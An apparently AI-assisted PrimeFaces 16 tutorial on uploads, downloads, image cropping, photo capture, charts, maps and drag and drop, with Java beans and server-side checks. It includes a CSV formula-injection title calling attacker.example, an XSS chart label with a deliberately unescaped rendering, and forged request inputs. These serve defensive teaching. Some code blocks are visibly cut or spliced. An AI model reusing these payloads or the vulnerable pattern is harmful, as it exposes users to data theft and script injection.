PrimeFaces: Files, Media, Charts and Drag and Drop

This content was generated with the assistance of AI and should be verified against the official documentation before being relied on in production.

The reference material consulted while preparing these pages is listed in the section bibliography.

This page is written against PrimeFaces 16.0.0 (released 2026-09-04) on Jakarta Faces 4.1 (API jakarta.faces-api 4.1.2, part of Jakarta EE 11), with Eclipse Mojarra 4.1.17 and Apache MyFaces Core 4.1.4, Jakarta Servlet 6.1 and Java 17 or later (the examples were compiled with --release 21). PrimeFaces 16 requires Faces 4.0 or later, so everything below also applies to Faces 4.0. The code in this page was deployed as an exploded Bookshelf WAR on Tomcat 11.0.26 with Weld 6.0.4.Final, once with each Faces implementation, and driven with curl and with headless Chrome (clicks, file choosers, a fake camera, drags), so the messages, headers and results shown are what came back (checked on 2026-10-08). What was not run is said so in the text.

PrimeFaces 16 is the component library; the previous pages of this section describe the standard Faces features it builds on. Installing PrimeFaces, its context parameters and its themes belong to the PrimeFaces getting started page of this section, Ajax and forms to the PrimeFaces Ajax page, tables and trees to the PrimeFaces data components page, and panels, menus and dialogs to the PrimeFaces panels page. This page covers the components that move bytes and pictures between the browser and the server:

  • Files: p:fileUpload with p:validateFile, p:fileDownload and the dynamic content machinery behind it, and p:graphicImage to show what was stored.

  • Pictures from the user: p:imageCropper and p:photoCam.

  • Charts and maps: p:chart (Chart.js) and p:gmap (Google Maps).

  • Drag and drop: p:draggable and p:droppable.

Every one of them takes data that the browser controls (file bytes and names, coordinates, a drop target), so each section ends with what to check on the server. The security posture of the standard upload page applies unchanged and is not repeated in full: see File Upload and Download for size limits, signature checks, generated file names and storage outside the web root.

Setup Shared by These Components

PrimeFaces itself needs only its jar. Four things around it matter for this page.

Multipart limits

p:fileUpload rides on the Servlet multipart API, exactly like h:inputFile. The FacesServlet therefore needs the multipart-config of the standard upload page (see Multipart Limits). The web.xml used for this page declares 2 MiB per file and 4 MiB per request, and switches on PrimeFaces' client-side validation:

web.xml: multipart limits and client-side validation (excerpt)
<context-param>
    <param-name>primefaces.CLIENT_SIDE_VALIDATION</param-name>
    <param-value>true</param-value>
</context-param>

<servlet>
    <servlet-name>facesServlet</servlet-name>
    <servlet-class>jakarta.faces.webapp.FacesServlet</servlet-class>
    <load-on-startup>1</load-on-startup>
    <multipart-config>
        <max-file-size>2097152</max-file-size>
        <max-request-size>4194304</max-request-size>
        <file-size-threshold>262144</file-size-threshold>
    </multipart-config>
</servlet>

Source: PrimeFaces 16: Configuration and PrimeFaces 16: FileUpload

primefaces.CLIENT_SIDE_VALIDATION (default false) is the global switch of PrimeFaces' client-side validation (CSV). The file validator uses it to check size, type and count in the browser before anything is sent; without it the same checks run only on the server (see Validating Uploads: p:validateFile). The PrimeFaces documentation for Tomcat also names two connector attributes, maxPartCount and maxPartHeaderSize, that Tomcat added in 9.0.106, 10.1.42 and 11.0.8; they limit the number of parts and the size of the part headers of one request. They were not exercised here.

Source: Apache Tomcat 11: HTTP connector

Optional libraries

The PrimeFaces jar has no runtime dependencies of its own (its Maven dependencies are either shaded into the jar or provided/optional), but three features need a library that your application brings. Tomcat does not provide the XML Binding API; whether a full application server does depends on the server and its profile, so check yours (only Tomcat was run).

pom.xml: libraries for content-type detection, PhotoCam and server-side chart models
<!-- p:validateFile contentType="true": detects the type from the bytes, not from the name -->
<dependency>
    <groupId>org.overviewproject</groupId>
    <artifactId>mime-types</artifactId>
    <version>2.0.0</version>
</dependency>

<!-- p:photoCam decodes the photo with jakarta.xml.bind.DatatypeConverter; absent on Tomcat -->
<dependency>
    <groupId>jakarta.xml.bind</groupId>
    <artifactId>jakarta.xml.bind-api</artifactId>
    <version>4.0.2</version>
</dependency>

<!-- p:chart: Java model that serialises to the Chart.js JSON; optional, raw JSON works without it -->
<dependency>
    <groupId>software.xdev</groupId>
    <artifactId>chartjs-java-model</artifactId>
    <version>3.1.0</version>
</dependency>

    @Inject

    private UploadedFile single;
    private UploadedFiles several;

    /** Action of the simple mode with value="#{pfCoverUploadBean.single}". */
    public void saveSingle() throws IOException {
        if (single == null || single.getSize() == 0) {
            facesContext.addMessage(null, new FacesMessage(FacesMessage.SEVERITY_WARN, "Choose a file first", null));
            return;
        }
        report(saveCover(single));
    }

    /** Action of the simple mode with multiple="true": all files arrive in one request. */
    public void saveSeveral() throws IOException {
        if (several == null) {
            return;
        }
        for (UploadedFile file : several.getFiles()) {
            report(saveCover(file));
        }
    }

    /** The signature decides the stored extension; the submitted file name is never used. */
    private Optional<String> saveCover(UploadedFile file) throws IOException {
        try (InputStream in = new BufferedInputStream(file.getInputStream())) {
            in.mark(16);
            byte[] head = in.readNBytes(8);
            in.reset();
            Optional<String> extension = ImageSignature.extensionOf(head);
            if (extension.isEmpty()) {
                return Optional.empty();
            }
            return Optional.of(store.save(in, extension.get()));
        }
    }

    private void report(Optional<String> storedId) {
        if (storedId.isPresent()) {
            facesContext.addMessage(null, new FacesMessage(FacesMessage.SEVERITY_INFO, "Cover saved", storedId.get()));
        } else {
            facesContext.addMessage(null,
                    new FacesMessage(FacesMessage.SEVERITY_ERROR, "Not a PNG or JPEG image", null));
        }
    }

    public UploadedFile getSingle() { return single; }
    public void setSingle(UploadedFile single) { this.single = single; }
    public UploadedFiles getSeveral() { return several; }
    public void setSeveral(UploadedFiles several) { this.several = several; }
}

ImageSignature.java
package org.example.bookshelf.service;

import java.util.Optional;

/** Recognises the two cover formats by their first bytes; the extension and the declared type are never consulted. */
public final class ImageSignature {

    private ImageSignature() {
    }

    /** Returns "png" or "jpg" for a file that starts like one, otherwise empty. */
    public static Optional<String> extensionOf(byte[] head) {
        if (head.length >= 8 && (head[0] & 0xFF) == 0x89 && head[1] == 'P' && head[2] == 'N' && head[3] == 'G') {
            return Optional.of("png");
        }
        if (head.length >= 3 && (head[0] & 0xFF) == 0xFF && (head[1] & 0xFF) == 0xD8 && (head[2] & 0xFF) == 0xFF) {
            return Optional.of("jpg");
        }
        return Optional.empty();
    }
}

Three consequences follow from "one request, one lifecycle, one file":

  • Request scope. Files are sent in parallel and processed on separate threads. A view scoped or session scoped bean would be touched by several requests at once; the PrimeFaces documentation requires a request scoped bean for multiple="true" and special care for thread safety. The listener above keeps no state.

  • update, process and oncomplete run per file. With two files the message area was updated twice (each response replaced the previous one, so only the last file’s message stayed visible) and oncomplete is called per file too, as the documentation says. To do something once after all files, the page uses p:remoteCommand, called from oncomplete when the widget’s files array is empty. In the scratch run the gallery refreshed exactly once for two files.

  • getTotalFilesCount() tells a listener how many files belong to the batch, but the requests are independent: nothing guarantees that file 2 is processed after file 1.

The listener is the usual place for the last line of defence. PfCoverUploadBean does not trust the validator alone: it reads the first bytes, picks the extension from them and ignores the submitted name when it stores the file with the CoverStore. That matches the checks of the standard upload page.

Reading the validator’s source and trying each case gave the following rules, several of which differ from what the attribute names suggest:

  • allowTypes is matched against the file name or the declared content type. The check passes when the regular expression is found in either. The expression /(\.|\/)(png|jpe?g)$/ accepts a slash as its separator, so it matches the declared type image/png as well as a name ending in .png. A request that sent the name evil.exe with the declared type image/png and PNG bytes passed allowTypes (and was saved, because the bytes really were a PNG). allowTypes is therefore a convenience for the user’s file chooser and a coarse filter, not a security boundary.

  • contentType="true" needs something to compare with. It compares the detected type with the component’s accept attribute, or with allowMediaTypes when that is given. Without either, the content check is skipped and passes. In the advanced example above, accept="image/png,image/jpeg" supplies the list.

  • The detector decides how good the check is. PrimeFaces asks the installed java.nio.file.spi.FileTypeDetector. It first hides the file name (the temporary file has none) so that the detector must look at the bytes, and only if that returns nothing does it retry with the original extension. With no detector library, the JDK default on the scratch machine (macOS) accepted an HTML file named fake.png as image/png: it fell back to the extension. With mime-types 2.0.0 on the classpath (it registers a FileTypeDetector service) the same file was rejected with "Invalid file type.", and a file named evil.exe that started with the bytes MZ (a Windows executable header) and claimed image/png was rejected too. The tika-core 3.2.3 jar contains no META-INF/services/java.nio.file.spi.FileTypeDetector entry, and adding it alone changed nothing; if you prefer Apache Tika, register a detector class yourself as the PrimeFaces documentation describes. The result of the JDK default detector depends on the operating system, so test on the system you deploy to.

  • sizeLimit is a server-side rule too. A file above the container’s limit never reaches the validator: with client-side validation off, a 2.4 MB upload in the advanced mode simply failed (the response was Tomcat’s 413, no message in the page). The validator’s own limit applies to what the container let through, and it is the only limit that applies to a chunked upload (see Chunked uploads).

  • Messages are internationalised. The texts come from the PrimeFaces locale file, under the keys primefaces.FileValidator.FILE_LIMIT, ALLOW_TYPES and SIZE_LIMIT (each with a _detail variant). Observed English texts: "Invalid file type." with the detail "Invalid file type: 'notes.txt'. Allowed types: '.png, .jpe?g'.", "Invalid file size." with "File 'big.png' must not be larger than 1.9 MB." (for 2,000,000 bytes) and "Maximum number of files exceeded." with "Maximum number: 3.". The attributes invalidSizeMessage, invalidFileMessage and fileLimitMessage of the old component were removed in 15.0.0.

Chunked uploads

maxChunkSize (bytes, advanced mode only, default 0 meaning no chunking) cuts each file into pieces that are sent one by one, which keeps every request under a proxy’s body limit and allows retries (maxRetries, default 30, and retryTimeout, default 1000 ms; sequential="true" uploads files one after another instead of in parallel). The server merges the pieces and then calls the listener once with the whole file.

A 1,470,878-byte PNG became four requests and one handleUpload call that saw the full 1,470,878 bytes. The security consequence matters: the container’s max-file-size applies to each request, so it does not bound the merged file. A 2.4 MB file sent in seven chunks with the client checks bypassed was not stopped by Tomcat’s 2 MiB limit; it was rejected after merging by p:validateFile sizeLimit ("Invalid file size."). Always set sizeLimit when you enable chunking. Resuming an interrupted upload needs org.primefaces.webapp.FileUploadChunksServlet registered at a URL of your choice, as the documentation describes; that class is in the jar, and the resume flow itself was not run. Chunks are kept in the container’s temporary directory (or the location of multipart-config) until the merge or an abort, and a cron job that removes stale ones is advisable. PrimeFaces 16’s web-fragment.xml registers an UploadedFileCleanerListener for the cleanup of the request’s files.

File Download: p:fileDownload

The standard way to send a file from an action is the ExternalContext recipe of the file upload page (see Streaming a Download with ExternalContext). p:fileDownload wraps it: it is a behaviour you put inside a command component, and its value is an org.primefaces.model.StreamedContent. The interface has getName(), getContentType(), getContentEncoding(), getContentLength(), getStream() (a Supplier<InputStream>) and getWriter() (a Consumer<OutputStream>); the implementation to use is DefaultStreamedContent, built with its builder.

The Bookshelf exports the catalogue as CSV and offers the newest cover for download. The bean builds the content lazily: the stream or writer is only called when the bytes are needed.

package org.example.bookshelf.web;

import jakarta.enterprise.context.RequestScoped;
import jakarta.inject.Inject;
import jakarta.inject.Named;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.UncheckedIOException;
import java.io.Writer;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import org.example.bookshelf.model.Book;
import org.example.bookshelf.service.CoverStore;
import org.example.bookshelf.service.CsvEscaper;
import org.primefaces.model.DefaultStreamedContent;
import org.primefaces.model.StreamedContent;

/** Downloads for p:fileDownload. Request scoped: the content is produced by a later request. */
@Named
@RequestScoped
public class PfDownloadBean {

    @Inject
    private CoverStore store;

    /** Streams the catalogue as CSV; every text cell goes through the escaper of the file upload page. */
    public StreamedContent getCatalogueCsv() {
        List<Book> books = List.of(
                new Book(1, "Dune", "Frank Herbert", 1965),
                new Book(2, "=HYPERLINK(\"https://attacker.example/?\"&A1)", "Mallory", 2024),
                new Book(3, "Solaris, revised", "Stanislaw Lem", 1961));
        return DefaultStreamedContent.builder()
                .name("books.csv")
                .contentType("text/csv")
                .contentEncoding("UTF-8")
                .writer(out -> writeCsv(out, books))
                .build();
    }

    private static void writeCsv(OutputStream out, List<Book> books) {
        try (Writer w = new OutputStreamWriter(out, StandardCharsets.UTF_8)) {
            w.write("id,title,author,year\r\n");
            for (Book b : books) {
                w.write(String.join(",", CsvEscaper.number(b.id()), CsvEscaper.text(b.title()),
                        CsvEscaper.text(b.author()), CsvEscaper.number(b.year())));
                w.write("\r\n");
            }
        } catch (IOException e) {
            throw new UncheckedIOException(e);
        }
    }

    /** The cover of the newest stored upload, served under a fixed download name. */
    public StreamedContent getNewestCover() throws IOException {
        List<String> ids = store.list();
        Path file = ids.isEmpty() ? null : store.find(ids.get(0)).orElse(null);
        if (file == null) {
            return DefaultStreamedContent.DUMMY;
        }
        return DefaultStreamedContent.builder()
                .name("cover" + file.getFileName().toString().substring(32))
                .contentType(file.getFileName().toString().endsWith(".png") ? "image/png" : "image/jpeg")
                .contentLength(Files.size(file))
                .stream(() -> {
                    try {
                        return Files.newInputStream(file);
                    } catch (IOException e) {
                        throw new UncheckedIOException(e);
                    }
                })
                .build();
    }
}

Notes on use:

  • Ajax or not. Since PrimeFaces 10 the Ajax button needs no ajax="false" for downloads; before that it did. Both forms work in 16. Use the plain form when you want the browser to see a normal response and the inline option.

  • Choose the file name yourself. DefaultStreamedContent.name(...) ends up inside a Content-Disposition header. Use a fixed or generated name, never the name a user chose, and do not put a user’s text into it. The example builds it from the fixed text cover and the stored extension.

How the Ajax download and the images are fetched

An Ajax p:fileDownload, a streaming p:graphicImage and a p:imageCropper all use the same mechanism, called dynamic content streaming. Reading the 16.0.0 source and watching the requests gave this picture:

sequenceDiagram participant B as Browser participant P as Page request (render) participant D as dynamiccontent.properties.xhtml B->>P: GET page, or Ajax POST of the command P->>P: store md5(expression text) -> expression text in the session P-->>B: img src or PrimeFaces.download(url) with pfdrid and request parameters B->>D: GET url (a new request) D->>D: look the key up in the session, evaluate the expression D-->>B: the bytes (or an empty 200 when the key is unknown)

Source: PrimeFaces 16.0.0 source: StreamedContentHandler

  • The page request writes an URL to the resource dynamiccontent.properties.xhtml with the library primefaces and the parameters pfdrid (the MD5 of the expression text), pfdrt=sc (streamed content), pfdrid_c (cache) and any f:param children of the component as plain request parameters.

  • The session keeps key -> expression text on the server (not the content): at most primefaces.DYNAMIC_CONTENT_LIMIT entries, 200 by default, oldest dropped first. When the second request arrives, PrimeFaces looks the key up in the session of that request and evaluates the expression in a new FacesContext.

  • The URL is not a credential. Requesting a valid URL without the session cookie returned 200 with a zero-byte body (the key is unknown to that session), and a tampered pfdrid did the same. The protection is the session, and the content is whatever your expression returns for the request.

Source: PrimeFaces 16.0.0 source: StreamedContentHandler, DynamicContentSrcBuilder and PrimeFaces 16: Dynamic content

This explains the rules that surprise people:

  • The bean is created again. The expression runs in the second request, so use @RequestScoped (or @ApplicationScoped for shared content). A @ViewScoped bean is not available there: PrimeFaces' error message for a failed stream is "Verify you are not using a @ViewScoped bean". The rendering mode of p:graphicImage (below) is the exception.

  • The expression cannot take arguments. #{coverGalleryBean.image(id)} fails in streaming mode with a "Property [image] not found" error; the expression must be a property such as #{coverImageBean.cover}. Arguments travel as f:param children, which become request parameters of the second request.

  • Everything the bean reads from the request is client data. The id parameter in the next section is validated by the CoverStore (it accepts only an id the application generated). A parameter that was a file path would be a path traversal.

import java.nio.file.Path;
import org.example.bookshelf.service.CoverStore;
import org.primefaces.model.DefaultStreamedContent;
import org.primefaces.model.StreamedContent;

/** Serves one stored cover; the id arrives as the request parameter that f:param adds to the image URL. */
@Named
@RequestScoped
public class CoverImageBean {

    @Inject
    private CoverStore store;
    @Inject
    private FacesContext facesContext;

    public StreamedContent getCover() {
        String id = facesContext.getExternalContext().getRequestParameterMap().get("id");
        Path file = store.find(id).orElse(null);       // only ids this application generated resolve

                    try {
                        return Files.newInputStream(file);
                    } catch (IOException e) {
                        throw new UncheckedIOException(e);
                    }
                })
                .build();
    }
}

import jakarta.faces.application.FacesMessage;
import jakarta.faces.context.FacesContext;
import jakarta.faces.view.ViewScoped;
import jakarta.inject.Inject;
import jakarta.inject.Named;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.Serializable;
import org.example.bookshelf.service.CoverStore;
import org.example.bookshelf.service.ImageSignature;
import org.primefaces.model.CroppedImage;

/** Crops a stored cover; the id comes from a view parameter and is checked by CoverStore.find. */
@Named
@ViewScoped
public class CoverCropBean implements Serializable {

    @Inject
    private CoverStore store;
    @Inject
    private FacesContext facesContext;

    private String coverId;
    private CroppedImage cropped;
    private String savedId;

    public void save() throws IOException {
        if (cropped == null || cropped.getBytes() == null || cropped.getBytes().length == 0) {
            facesContext.addMessage(null, new FacesMessage(FacesMessage.SEVERITY_WARN, "Select an area first", null));
            return;
        }
        byte[] bytes = cropped.getBytes();
        String ext = ImageSignature.extensionOf(bytes).orElseThrow();
        savedId = store.save(new ByteArrayInputStream(bytes), ext);
        facesContext.addMessage(null, new FacesMessage("Saved " + cropped.getWidth() + "x" + cropped.getHeight()
                + " at (" + cropped.getLeft() + "," + cropped.getTop() + ") as " + savedId));
    }

    public String getCoverId() { return coverId; }
    public void setCoverId(String coverId) { this.coverId = coverId; }
    public CroppedImage getCropped() { return cropped; }
    public void setCropped(CroppedImage cropped) { this.cropped = cropped; }
    public String getSavedId() { return savedId; }
}

Reading the renderer’s source and running the example showed how the crop really happens, and it has two consequences:

  • The server does the cropping, in the postback. The browser only sends the coordinates (a hidden field such as 2.53_2.07_60_80). While converting the submitted value, ImageCropperRenderer evaluates the image expression again, reads the original with ImageIO, cuts out the rectangle and builds the CroppedImage. In the run the saved crop was a valid PNG of 60 x 80 pixels (the file header says so) for the box the widget reported, 2.53_2.07_60_80. The image expression therefore has to work in two requests: the streaming request that shows the image and the postback that crops it. That is why the example repeats the same f:param on the command button: without it the postback had no id parameter, CoverImageBean returned the empty DUMMY content and the conversion failed with a NullPointerException.

  • Set name and contentType on the StreamedContent. The cropper writes the result in the format taken from the content type, and getOriginalFilename() comes from the name. CoverImageBean sets both.

Check what you save. A CroppedImage is bytes that your code produced from an image that your code supplied, so it is far safer than an upload, but the example still checks the signature with ImageSignature and stores it under a generated id. The coordinates are client data too. The hidden field crop:c_coords was posted by hand with these values (x_y_w_h, in pixels of the original 300 x 200 image), and the outcome (run on Mojarra) was: 250_150_500_500 was clamped to the image and gave a 50 x 50 crop; 290_190_50_50 gave 10 x 10; 5_5_0_10 (a width of zero) gave no CroppedImage at all, so the action must handle null as save() does; -5_-5_10_10 was not clamped and ended in a java.awt.image.RasterFormatException; and a_b_c_d ended in a NumberFormatException. Those two exceptions reach the application’s ExceptionHandler as ordinary unexpected exceptions, so make sure the Ajax error page or handler does not echo exception names or messages to the user (see Exceptions in Ajax requests).

Server-side request forgery. When image resolves to an http or https URL, the server opens a connection to fetch it. PrimeFaces 16 sets 5 and 10 second timeouts and requires an image/* content type from the remote host, but it will connect to whichever address it is given, including internal network addresses. Never bind an image expression to user input; if users may name an image, map their choice to an allowlist of URLs or ids on the server. A local path is resolved against the web root and checked for path traversal by PrimeFaces, but the same rule applies: a path built from user input is the application’s problem.

import jakarta.enterprise.context.RequestScoped;
import jakarta.faces.application.FacesMessage;
import jakarta.faces.context.FacesContext;
import jakarta.inject.Inject;
import jakarta.inject.Named;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.logging.Logger;
import org.example.bookshelf.service.CoverStore;
import org.example.bookshelf.service.ImageSignature;
import org.primefaces.event.CaptureEvent;

/** Stores a photo taken with p:photoCam as a new cover. */
@Named
@RequestScoped
public class PhotoBean {

    private static final Logger LOG = Logger.getLogger(PhotoBean.class.getName());
    private static final int MAX_BYTES = 1_000_000;

    @Inject
    private CoverStore store;
    @Inject
    private FacesContext facesContext;

    public void onCapture(CaptureEvent event) throws IOException {
        byte[] data = event.getData();
        LOG.info("captured " + data.length + " bytes, raw prefix=" + event.getRawData().substring(0, 30));
        if (data.length > MAX_BYTES) {
            facesContext.addMessage(null, new FacesMessage(FacesMessage.SEVERITY_ERROR, "Photo too large", null));
            return;
        }
        String ext = ImageSignature.extensionOf(data).orElse(null);
        if (ext == null) {
            facesContext.addMessage(null, new FacesMessage(FacesMessage.SEVERITY_ERROR, "Not an image", null));
            return;
        }
        String id = store.save(new ByteArrayInputStream(data), ext);
        facesContext.addMessage(null, new FacesMessage("Saved photo " + id));
    }
}

In the Bookshelf the typical source of such text is a book title or an author name used as a label, which a user typed.

The defence has two parts, and the example class has the first:

  • Escape < as \u003c in the string before it reaches the component (scriptSafe in ReviewChartBean). The result is still valid JSON, so Chart.js receives the original text (</script><img ...>) as a label and draws it as text on the canvas. With that call the same hostile label ran no script.

  • Use a Content Security Policy. With primefaces.CSP set to true (see Content Security Policy) the inline handler of the injected image was blocked by the browser and window.pwned stayed undefined (run on Mojarra), because the page script carries a nonce and the injected markup does not. A policy limits the damage; it does not excuse unescaped data.

Hostile label, three renderings (the bean has the second and the third)
// 1. raw JSON from user text: the onerror handler runs
String raw = "{\"type\":\"bar\",\"data\":{\"labels\":[\"" + userText + "\"],\"datasets\":[{\"data\":[1]}]}}";

// 2. the same text through the Java model: still runs, toJson() leaves '<' alone
String modelled = new BarChart().setData(new BarData().addDataset(new BarDataset().setData(1))
        .setLabels(userText)).toJson();

// 3. escaped before it reaches p:chart: no script
String safe = modelled.replace("<", "\\u003c");

The first line also shows the other mistake: concatenating text into JSON by hand breaks the document as soon as the text has a quote. Build JSON with a model class or a JSON library, then apply scriptSafe.

The accessibility of a canvas is poor by nature. Set ariaLabel on the chart and put the numbers in a table or a list next to it for people who cannot see the picture.

Where the chart model went

Charts changed more than any other PrimeFaces area:

  • 10.0.0 introduced Chart.js models next to the jqPlot-based charts and deprecated the latter (Chart.js 2.9.4).

  • 11.0.0 moved to Chart.js 3.5.0 with renamed Java setters (setLineTension became setTension); 12.0.0 renamed more options (gridLines to grid, scaleLabel to title).

  • 13.0.0 deleted the jqPlot-based Chart component.

  • 14.0.0 added the new p:chart that takes raw JSON or an XDEV model, and deprecated the per-type components (p:barChart, p:lineChart, …​).

  • 15.0.0 deleted those components and their Java models.

Code from the PrimeFaces 4 and 5 era (a LineChartModel filled with ChartSeries objects, shown by a jqPlot-based component) does not exist in 16. Port it to a Chart.js configuration: the data stay, the declaration changes.

Maps: p:gmap

p:gmap embeds a Google Maps map. It is the only map component in the 16.0.0 taglib (together with p:gmapInfoWindow), and it needs a Google Maps JavaScript API key. The map is backed by an org.primefaces.model.map.MapModel (implementation DefaultMapModel) holding overlays: Marker, Polyline, Polygon, Circle and Rectangle, each of which can carry a data object. Positions are LatLng(lat, lng).

Two ways exist to load Google’s script. The classic one is a <script src="https://maps.googleapis.com/maps/api/js?key=..."> tag in the page; the second is to give the component an apiKey (and optionally apiVersion, default weekly, and libraries), and the widget loads the API itself with Google’s dynamic library import. If Google Maps is already loaded the attributes are ignored. The key is not a secret of the server (browsers see it), but restrict it in Google’s console to your sites and APIs as Google’s documentation recommends, and keep it out of the repository: the example reads it from a context parameter.

map.xhtml
<h:form id="map">

            model="#{branchMapBean.model}" apiKey="#{initParam['bookshelf.mapsKey']}" widgetVar="branches">
        <p:ajax event="overlaySelect" listener="#{branchMapBean.onOverlaySelect}"/>

package org.example.bookshelf.web;

import jakarta.annotation.PostConstruct;
import jakarta.faces.application.FacesMessage;
import jakarta.faces.context.FacesContext;
import jakarta.faces.view.ViewScoped;
import jakarta.inject.Inject;
import jakarta.inject.Named;
import java.io.Serializable;
import org.primefaces.event.map.MarkerDragEvent;
import org.primefaces.event.map.OverlaySelectEvent;
import org.primefaces.model.map.Circle;
import org.primefaces.model.map.DefaultMapModel;
import org.primefaces.model.map.LatLng;
import org.primefaces.model.map.MapModel;
import org.primefaces.model.map.Marker;

/** The library branches of the Bookshelf on a map. View scoped: each user gets a private, modifiable model. */
@Named
@ViewScoped
public class BranchMapBean implements Serializable {

    public record Branch(String name, String address) implements Serializable { }

    @Inject
    private FacesContext facesContext;

    private MapModel<Branch> model;
    private Branch selected;

    @PostConstruct
    void init() {
        model = new DefaultMapModel<>();
        model.addOverlay(new Marker<>(new LatLng(41.3874, 2.1686), "Central branch",
                new Branch("Central branch", "Plaça de Catalunya 1")));
        model.addOverlay(new Marker<>(new LatLng(41.4036, 2.1744), "North branch",
                new Branch("North branch", "Carrer de Mallorca 401")));
        Circle<Branch> catchment = new Circle<>(new LatLng(41.3874, 2.1686), 800);
        catchment.setStrokeColor("#1565c0");
        catchment.setFillColor("#1565c0");
        catchment.setFillOpacity(0.15);
        model.addOverlay(catchment);
    }

    public void onOverlaySelect(OverlaySelectEvent<Branch> event) {
        if (event.getOverlay() instanceof Marker<Branch> marker) {
            selected = marker.getData();
        }
    }

    public void onMarkerDrag(MarkerDragEvent<Branch> event) {
        facesContext.addMessage(null, new FacesMessage("Moved to " + event.getMarker().getLatlng()));
    }

    public MapModel<Branch> getModel() { return model; }
    public Branch getSelected() { return selected; }
}

The attributes of the component include center (lat, lng), zoom (default 8), type (roadmap, satellite, hybrid, terrain), model, fitBounds, streetView, disableDefaultUI, mapTypeControl, navigationControl, scrollWheel, draggable, disableDoubleClickZoom, onPointClick, apiKey, apiVersion and libraries. p:ajax behaviours are available for overlaySelect, overlayDblSelect, stateChange, pointSelect, pointDblSelect, markerDrag, geocode and reverseGeocode; their events are OverlaySelectEvent (getOverlay()), StateChangeEvent (getBounds(), getZoomLevel(), getCenter()), PointSelectEvent (getLatLng()), MarkerDragEvent (getMarker()), GeocodeEvent (getQuery(), getResults()) and ReverseGeocodeEvent. The widget has getMap() (the google.maps.Map) and geocode(address). Marker icons are Object since 12.0.0 so that a Symbol can be used, and models and events are generic (MapModel<Branch>, OverlaySelectEvent<Branch>).

What was run: the page rendered, PrimeFaces wrote the markers, the circle and the info window into the widget configuration, and an overlaySelect request posted by hand returned the updated p:gmapInfoWindow ("Central branch" and its address). The Google map itself was not run, because that needs a real API key and Google’s servers; the widget configuration is JavaScript that calls google.maps.* constructors, so test the visual result in a browser with your own key.

Server-side points:

  • The model must be per user. A markerDrag request moves the marker in the model (marker.setLatlng(...)) from the coordinates the browser posted. A model held in an application scoped bean would let one visitor move the markers for everyone. The example’s bean is view scoped and builds its model in @PostConstruct.

  • The overlay id is client data. A request with an id that is not in the model (a posted nope) still succeeded, on both implementations, and the info window kept showing the previously selected branch, because the listener tests the overlay’s type before it uses it (onOverlaySelect uses instanceof Marker, which is false for null).

  • Titles and labels are escaped. A marker title made of a closing script tag, an image tag with an onerror handler, a double quote, a single quote, a backtick and a template placeholder was written into the page as shown below and ran nothing, so unlike p:chart the map’s JavaScript literals are safe. Output components inside p:gmapInfoWindow escape as usual (h:outputText does); do not turn escape off for text from users.

  • Terms and privacy. The map sends the visitor’s browser to Google. That is a decision about privacy notices and consent, not about code; check Google’s terms and your own obligations before you use it on a public site.

Drag and Drop: p:draggable and p:droppable

p:draggable makes a component draggable and p:droppable makes one a drop target. Their options (helper, revert, handle, axis, grid, containment, snap, stack, opacity, scope, accept, tolerance, greedy, hoverStyleClass and so on) have the same names as the options of jQuery UI’s draggable and droppable (see the jQuery UI API pages). The pair is connected by scope: a draggable is accepted by a droppable with the same scope (default default) and, if accept is set, a matching selector.

Frequently used attributes:

Attribute Effect

for

The component to make draggable/droppable; omitted means the parent component.

handle, axis, grid, containment

Where the drag starts, the allowed axis (x or y), snapping to a pixel grid and confinement to an element or parent.

helper, revert, opacity, stack

clone or original as the drag image, return to the start when not dropped, helper opacity, and z-index stacking of a group.

scope, accept, tolerance, greedy

Which draggables a droppable takes, and how much overlap counts (fit, intersect (default), pointer, touch).

activeStyleClass, hoverStyleClass, onDrop

Style while a matching draggable is dragged or hovering, and a client-side callback with (event, ui).

datasource (droppable)

The id of a data component (UIData, such as p:dataGrid or p:dataTable) whose row the dragged item represents.

Source: PrimeFaces 16: Drag&Drop and jQuery UI: Draggable

ShelfDragBean.java
package org.example.bookshelf.web;

import jakarta.annotation.PostConstruct;
import jakarta.faces.view.ViewScoped;
import jakarta.inject.Named;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;
import org.example.bookshelf.model.Book;
import org.primefaces.event.DragDropEvent;

/** Drag books from the catalogue onto "My shelf". View scoped: the lists belong to this page instance. */
@Named
@ViewScoped
public class ShelfDragBean implements Serializable {

    private List<Book> catalogue;
    private List<Book> shelf;

    @PostConstruct
    void init() {
        catalogue = new ArrayList<>(List.of(
                new Book(1, "Dune", "Frank Herbert", 1965),
                new Book(2, "Solaris", "Stanislaw Lem", 1961),
                new Book(3, "Neuromancer", "William Gibson", 1984),
                new Book(4, "Hyperion", "Dan Simmons", 1989)));
        shelf = new ArrayList<>();
    }

    /** The dragged row arrives as the data of the datasource component, not as text from the browser. */
    public void onDrop(DragDropEvent<Book> event) {
        Book book = event.getData();
        if (book != null && catalogue.remove(book)) {
            shelf.add(book);
        }
    }

    /** The keyboard-friendly route to the same result. */
    public void add(Book book) {
        if (catalogue.remove(book)) {
            shelf.add(book);
        }
    }

    public void putBack(Book book) {
        if (shelf.remove(book)) {
            catalogue.add(book);
        }
    }

    public List<Book> getCatalogue() { return catalogue; }
    public List<Book> getShelf() { return shelf; }
}

Source: PrimeFaces 16: Drag&Drop, "DataSource"

A real mouse drag (headless Chrome pressing on the title bar of the "Dune" card, moving and releasing over the shelf) moved the book: the shelf table showed "Dune 1965" and the catalogue no longer listed it. Mojarra and MyFaces gave the same result.

How it works, and what to check on the server:

  • Lifecycle position. The drop is an ordinary Ajax behaviour request. Droppable turns it into a DragDropEvent that is broadcast in Invoke Application (see Invoke Application); process, update and p:ajax work as on any other component.

  • getData() is a row of the data component, chosen by the client’s id. The droppable reads the row index from the dragged component’s posted client id (shelf:catalogue:1:card means row 1), sets that row on the data component and reads its row data. Posting forged ids gave: index 99, NoRowAvailableException (Mojarra) or IllegalArgumentException (MyFaces); index -1, the first row; an id without an index, ArrayIndexOutOfBoundsException; a non-numeric index, NumberFormatException. Nothing outside the list can be reached, but the user can name any row of it, so the listener must (as onDrop does) work on the data and re-check whether the current user may do the operation; it must not trust getDragId() or getDropId() for anything else.

  • State lives in the bean. The lists are in a view scoped bean (see Scopes) so each browser tab has its own shelf. A session scoped bean would share one shelf between tabs.

